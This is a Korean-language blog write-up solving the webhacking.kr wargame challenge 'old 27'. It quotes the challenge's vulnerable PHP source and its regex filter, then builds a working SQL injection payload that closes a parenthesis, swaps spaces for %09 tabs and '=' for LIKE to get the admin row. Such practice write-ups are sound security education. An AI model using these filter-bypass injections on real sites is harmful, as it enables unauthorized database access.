---
title: "webhacking.kr old 27 문제 풀이"
date: 2025-04-11 00:10:00 +0800
categories: [Wargame, Webhacking.kr]
tags: [cyber security, writeup, webhackingkr, web hacking, sql injection]
description: webhacking.kr old 27 문제 풀이
---

[https://webhacking.kr/challenge/web-12](https://webhacking.kr/challenge/web-12)
# 문제 풀이
## 분석
사이트에 접속하면 떡하니 SQL Injection 문제라고 힌트를 제공하고 있고 소스코드까지 주어진다.<br />
### 소스코드
```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 27</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get action=index.php>
<input type=text name=no><input type=submit>
</form>
<?php
  if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
  if($r['id']=="guest") echo("guest");
  if($r['id']=="admin") solve(27); // admin's no = 2
}
?>
<br><a href=?view_source=1>view-source</a>
</body>
</html>
```
코드를 보면 유저로부터 no라는 입력 값을 받아서 `select id from chall27 where id='guest' and no={user_input}`을 수행하고 결과의 id가 admin이라면 문제가 해결되는 방식이라고 한다.<br />
참고로 admin의 no은 2라는 것도 친절하게 알려주고 있다.
#### 필터링
```php
"/#|select|\(| |limit|=|0x/i"
```
하지만 쿼리 문을 실행하기 이전에 어떠한 필터링이 존재하는 것이 보인다.<br />
정규식을 이용해서 필터링을 하고있어서 어떤 구문들이 막히는건지 하나하나 살펴보아야 할 듯 하다.<br />
- \#
- select
- (
- space character
- limit
- =
- 0x

## 최종 풀이
위 필터링되는 문자, 구문들을 우회하여 id가 admin인 결과를 뽑아내는 것이 우리의 목표이다.<br />
### 필터링 우회
```php
$r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
```
우리가 값을 입력하면 `no=(` 다음으로 값이 들어간다. 그리고 필터링을 보면 ')' 닫는 괄호는 필터링에 걸리지 않으므로 쿼리의 열린 괄호를 강제로 닫는 것이 가능하다는 것이다.<br />

우선 우리가 사용해야하는 문자나 구문을 미리 정하고 해당 부분 들을 어떻게 우회할지 생각하는 것이 우선이다.<br />
```
123) or id=admin and no=2 -- 
```
아마 이렇게 작성하면 작동할 것 같은데 space와 '=' 기호에 필터링이 걸릴 것이다.<br />
space는 SQL 쿼리에서 탭 문자(%09)로 우회가 가능하고 등호는 like 구문을 사용하면 될 듯 하다.

```
123)%09or%09id%09like%09'admin'%09and%09no%09like%09'2'%09--%09
```
그렇게 필터링에 걸릴만한 부분들을 모두 변환해주고 URL에 직접 입력해주면 문제가 해결된다.